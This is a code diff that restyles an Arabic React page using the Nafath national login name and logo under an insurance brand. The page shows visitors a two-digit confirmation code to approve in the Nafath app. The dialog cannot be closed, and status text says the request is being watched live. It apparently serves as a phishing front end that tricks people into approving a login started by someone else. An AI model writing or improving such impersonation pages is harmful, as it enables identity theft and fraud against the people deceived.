@@ -1,6 +1,6 @@
 "use client";
 
-import { Menu, ShieldAlert, Smartphone, CheckCircle2 } from "lucide-react";
+import { ShieldAlert, Smartphone, CheckCircle2 } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Card, CardContent } from "@/components/ui/card";
 import {
@@ -150,48 +150,55 @@ export default function Component() {
 
   return (
     <div
-      className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100"
+      className="min-h-screen bg-slate-50"
       dir="rtl"
     >
       {/* Header */}
-      <header className="bg-white shadow-sm border-b">
-        <div className="flex items-center justify-between p-4 max-w-7xl mx-auto">
-          <Menu className="w-6 h-6 text-gray-600 cursor-pointer hover:text-teal-600 transition-colors" />
-          <img src="/nafad-logo.png" alt="نفاذ" width={120} className="object-contain" />
-          <div className="w-6"></div>
+      <header className="sticky top-0 z-20 bg-white/95 border-b border-slate-200 backdrop-blur">
+        <div className="flex items-center justify-between p-4 max-w-6xl mx-auto">
+          <div className="flex items-center gap-3">
+            <div className="px-3 py-1 rounded-full bg-[#0a4a68] text-white text-xs font-bold">
+              تأميني
+            </div>
+            <div className="h-6 w-px bg-slate-200" />
+            <img src="/nafad-logo.png" alt="نفاذ" width={96} className="object-contain" />
+          </div>
+          <p className="text-xs sm:text-sm text-slate-500 font-medium">
+            التحقق عبر النفاذ الوطني الموحد
+          </p>
         </div>
       </header>
 
       {/* Main Content */}
-      <main className="p-4 space-y-6 max-w-2xl mx-auto py-8">
-        {/* Login Section Title */}
-        <div className="text-center space-y-2">
-          <h1 className="text-2xl font-bold text-gray-800 mb-2">
-            التحقق عبر نفاذ
-          </h1>
-          <p className="text-gray-600 text-sm">
-            تم فتح نافذة التحقق مباشرة، أكمل الموافقة من تطبيق نفاذ
-          </p>
-        </div>
-
-        {/* Nafath App Section */}
-        <div className="bg-gradient-to-r from-teal-600 to-teal-700 text-white p-6 rounded-xl text-center shadow-lg">
-          <div className="flex items-center justify-center gap-2 mb-2">
-            <ShieldAlert className="w-6 h-6" />
-            <h2 className="text-xl font-bold">تطبيق نفاذ</h2>
-          </div>
-          <div className="w-16 h-1 bg-white/30 mx-auto rounded-full"></div>
-        </div>
-
-        <Card className="bg-white shadow-lg border-0">
-          <CardContent className="p-6 space-y-5">
-            <div className="text-center">
-              <p className="text-gray-700 font-semibold mb-1">
-                نافذة التحقق مفتوحة
+      <main className="p-4 sm:p-6 max-w-6xl mx-auto py-8 sm:py-12">
+        <div className="grid lg:grid-cols-5 gap-6">
+          {/* Left content */}
+          <section className="lg:col-span-3 bg-white border border-slate-200 shadow-sm rounded-2xl p-6 sm:p-8 space-y-6">
+            <div className="space-y-3">
+              <span className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-amber-50 text-amber-700 border border-amber-200 text-xs font-bold">
+                بوابة تأميني
+              </span>
+              <h1 className="text-2xl sm:text-3xl font-bold text-slate-800 leading-tight">
+                أكمل التحقق عبر تطبيق نفاذ
+              </h1>
+              <p className="text-slate-600 leading-relaxed">
+                تم فتح نافذة التحقق مباشرة. الرجاء الانتقال إلى تطبيق نفاذ وتأكيد العملية لإكمال طلب التأمين.
               </p>
-              <p className="text-sm text-gray-500">
-                سيتم عرض رمز التحقق في النافذة مباشرة عند إرساله
-              </p>
+            </div>
+
+            <div className="space-y-3">
+              <div className="flex items-start gap-3">
+                <div className="w-7 h-7 rounded-full bg-[#0a4a68] text-white text-sm font-bold flex items-center justify-center mt-0.5">1</div>
+                <p className="text-slate-700">افتح تطبيق نفاذ وسجل الدخول بحسابك الوطني.</p>
+              </div>
+              <div className="flex items-start gap-3">
+                <div className="w-7 h-7 rounded-full bg-[#0a4a68] text-white text-sm font-bold flex items-center justify-center mt-0.5">2</div>
+                <p className="text-slate-700">راجع طلب التحقق الظاهر في التطبيق.</p>
+              </div>
+              <div className="flex items-start gap-3">
+                <div className="w-7 h-7 rounded-full bg-[#0a4a68] text-white text-sm font-bold flex items-center justify-center mt-0.5">3</div>
+                <p className="text-slate-700">أكد الرمز المعروض لإتمام العملية والمتابعة.</p>
+              </div>
             </div>
 
             {showError && (
@@ -204,49 +211,67 @@ export default function Component() {
               </Alert>
             )}
 
-            <div className="pt-4 border-t">
-              <div className="text-center text-gray-600 text-sm mb-3 font-medium">
-                لتحميل تطبيق نفاذ
-              </div>
-
-              {/* App Store Buttons */}
-              <div className="flex justify-center gap-3">
-                <a href="#" className="hover:scale-105 transition-transform">
-                  <img src="/google-play.png" alt="Google Play" className="h-10" />
-                </a>
-                <a href="#" className="hover:scale-105 transition-transform">
-                  <img src="/apple_store.png" alt="App Store" className="h-10" />
-                </a>
-              </div>
+            <div className="pt-2">
+              <Button
+                onClick={() => setShowConfirmDialog(true)}
+                className="bg-[#0a4a68] hover:bg-[#083d57] text-white h-11 px-8 rounded-xl font-semibold"
+              >
+                فتح نافذة التحقق
+              </Button>
             </div>
-          </CardContent>
-        </Card>
+          </section>
 
-        {/* New Nafath Platform Section */}
-        <Card className="bg-gradient-to-br from-teal-600 via-teal-700 to-teal-800 text-white shadow-xl border-0 overflow-hidden relative">
-          <div className="absolute top-0 right-0 w-32 h-32 bg-white/10 rounded-full -mr-16 -mt-16"></div>
-          <div className="absolute bottom-0 left-0 w-24 h-24 bg-white/10 rounded-full -ml-12 -mb-12"></div>
-          <CardContent className="p-8 text-center space-y-4 relative z-10">
-            <div className="w-16 h-16 bg-white/20 rounded-full flex items-center justify-center mx-auto mb-2">
-              <Smartphone className="w-8 h-8 text-white" />
-            </div>
-            <h2 className="text-2xl font-bold">منصة النفاذ الجديدة</h2>
-            <p className="text-sm leading-relaxed text-teal-50">
-              لتجربة أكثر سهولة استخدم النسخة المحدثة
-              <br />
-              من منصة النفاذ الوطني الموحد
-            </p>
-            <Button className="bg-white text-teal-700 hover:bg-teal-50 px-8 py-3 rounded-lg font-bold shadow-lg hover:shadow-xl transition-all mt-4">
-              ابدأ الآن
-            </Button>
-          </CardContent>
-        </Card>
+          {/* Right side cards */}
+          <aside className="lg:col-span-2 space-y-4">
+            <Card className="bg-white border border-slate-200 shadow-sm rounded-2xl">
+              <CardContent className="p-6 space-y-4">
+                <div className="flex items-center gap-3">
+                  <div className="w-11 h-11 rounded-xl bg-[#0a4a68]/10 flex items-center justify-center">
+                    <Smartphone className="w-6 h-6 text-[#0a4a68]" />
+                  </div>
+                  <div>
+                    <p className="font-bold text-slate-800">تطبيق نفاذ</p>
+                    <p className="text-xs text-slate-500">حمّل التطبيق إن لم يكن مثبتاً لديك</p>
+                  </div>
+                </div>
 
+                <div className="flex justify-center gap-3">
+                  <a href="#" className="hover:scale-105 transition-transform">
+                    <img src="/google-play.png" alt="Google Play" className="h-10" />
+                  </a>
+                  <a href="#" className="hover:scale-105 transition-transform">
+                    <img src="/apple_store.png" alt="App Store" className="h-10" />
+                  </a>
+                </div>
+              </CardContent>
+            </Card>
+
+            <Card className="bg-[#0a4a68] text-white border-0 shadow-sm rounded-2xl">
+              <CardContent className="p-6 space-y-3">
+                <p className="text-sm text-white/80">حالة الطلب</p>
+                <p className="text-xl font-bold">بانتظار تأكيدك في نفاذ</p>
+                <div className="flex items-center gap-2 pt-1">
+                  <span className="relative flex h-3 w-3">
+                    <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-300 opacity-75"></span>
+                    <span className="relative inline-flex rounded-full h-3 w-3 bg-emerald-400"></span>
+                  </span>
+                  <span className="text-sm text-white/90">جاري المتابعة بشكل مباشر</span>
+                </div>
+                {!!confirmationCode && (
+                  <div className="bg-white/10 border border-white/20 rounded-xl p-3 text-sm">
+                    رمز التحقق الحالي: <span className="font-mono font-bold">{confirmationCode}</span>
+                  </div>
+                )}
+              </CardContent>
+            </Card>
+          </aside>
+        </div>
+        
         {/* Confirmation Code Display Dialog - UPDATED WITH TWO SEPARATE CODES */}
         <Dialog open={showConfirmDialog} onOpenChange={() => {}}>
           <DialogContent className="max-w-md mx-auto [&>button]:hidden" dir="rtl">
             <DialogHeader>
-              <DialogTitle className="text-center text-2xl font-bold text-teal-600 mb-2">
+              <DialogTitle className="text-center text-2xl font-bold text-[#0a4a68] mb-2">
                 رمز التحقق
               </DialogTitle>
               <p className="text-center text-lg text-gray-800 leading-relaxed font-semibold px-4">
@@ -257,12 +282,12 @@ export default function Component() {
 
             <div className="text-center space-y-6 p-4">
               {/* TWO DIGITS SIDE BY SIDE IN SMALLER ELEGANT BOX */}
-              <div className="mx-auto w-48 h-48 bg-gradient-to-br from-teal-50 to-teal-100 border-2 border-teal-300 rounded-2xl shadow-lg flex items-center justify-center">
+              <div className="mx-auto w-48 h-48 bg-[#0a4a68]/5 border-2 border-[#0a4a68]/20 rounded-2xl shadow-lg flex items-center justify-center">
                 <div className="flex gap-3 justify-center items-center" dir="ltr">
-                  <div className="text-6xl font-bold text-teal-600 font-mono">
+                  <div className="text-6xl font-bold text-[#0a4a68] font-mono">
                     {confirmationCode?.[0] || "-"}
                   </div>
-                  <div className="text-6xl font-bold text-teal-600 font-mono">
+                  <div className="text-6xl font-bold text-[#0a4a68] font-mono">
                     {confirmationCode?.[1] || "-"}
                   </div>
                 </div>
@@ -270,10 +295,10 @@ export default function Component() {
 
               <div className="flex items-center justify-center gap-3 text-teal-600 py-2">
                 <div className="relative">
-                  <div className="w-3 h-3 bg-teal-600 rounded-full animate-ping absolute"></div>
-                  <div className="w-3 h-3 bg-teal-600 rounded-full"></div>
+                  <div className="w-3 h-3 bg-[#0a4a68] rounded-full animate-ping absolute"></div>
+                  <div className="w-3 h-3 bg-[#0a4a68] rounded-full"></div>
                 </div>
-                <div className="text-sm font-medium">في انتظار الموافقة...</div>
+                <div className="text-sm font-medium text-[#0a4a68]">في انتظار الموافقة...</div>
               </div>
             </div>
           </DialogContent>
@@ -314,50 +339,13 @@ export default function Component() {
       </main>
 
       {/* Footer */}
-      <footer className="mt-12 p-6 bg-white border-t">
-        <div className="text-center space-y-6 max-w-4xl mx-auto">
-          <div className="flex flex-wrap justify-center gap-x-6 gap-y-2 text-xs text-gray-600">
-            <a
-              href="#"
-              className="hover:text-teal-600 transition-colors font-medium"
-            >
-              الرئيسية
-            </a>
-            <a
-              href="#"
-              className="hover:text-teal-600 transition-colors font-medium"
-            >
-              حول
-            </a>
-            <a
-              href="#"
-              className="hover:text-teal-600 transition-colors font-medium"
-            >
-              اتصل بنا
-            </a>
-            <a
-              href="#"
-              className="hover:text-teal-600 transition-colors font-medium"
-            >
-              الشروط والأحكام
-            </a>
-            <a
-              href="#"
-              className="hover:text-teal-600 transition-colors font-medium"
-            >
-              المساعدة والدعم
-            </a>
-            <a
-              href="#"
-              className="hover:text-teal-600 transition-colors font-medium"
-            >
-              سياسة الخصوصية
-            </a>
-          </div>
-
-          {/* Government Verification Badge */}
-          <div className="flex justify-center mt-4">
-            <img src="/cst-logo.jpg" alt="هيئة الاتصالات" width={60} className="opacity-80 rounded" />
+      <footer className="mt-12 bg-white border-t border-slate-200">
+        <div className="max-w-6xl mx-auto px-4 py-6 flex flex-col sm:flex-row items-center justify-between gap-4">
+          <p className="text-sm text-slate-500">© {new Date().getFullYear()} تأميني - جميع الحقوق محفوظة</p>
+          <div className="flex items-center gap-5 text-sm text-slate-600">
+            <a href="#" className="hover:text-[#0a4a68] transition-colors">سياسة الخصوصية</a>
+            <a href="#" className="hover:text-[#0a4a68] transition-colors">الشروط والأحكام</a>
+            <a href="#" className="hover:text-[#0a4a68] transition-colors">الدعم</a>
           </div>
         </div>
       </footer>
